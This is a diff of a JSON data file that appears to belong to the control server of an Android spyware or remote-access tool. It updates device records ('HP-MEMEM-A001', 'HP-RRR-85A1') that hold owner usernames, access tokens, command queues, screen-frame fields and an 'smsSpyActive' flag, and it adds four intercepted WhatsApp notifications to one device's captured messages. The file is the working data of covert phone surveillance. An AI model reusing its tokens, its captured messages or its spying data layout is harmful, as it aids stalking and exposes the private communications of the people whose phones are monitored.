@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777207526646,
+    "lastSeen": 1777207533688,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
@@ -4053,6 +4053,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "26/04 20:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777207534573
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "26/04 20:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777207532461
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "26/04 20:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777207531508
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "26/04 20:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777207530501
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8313,7 +8345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777207528053,
+    "lastSeen": 1777207533312,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
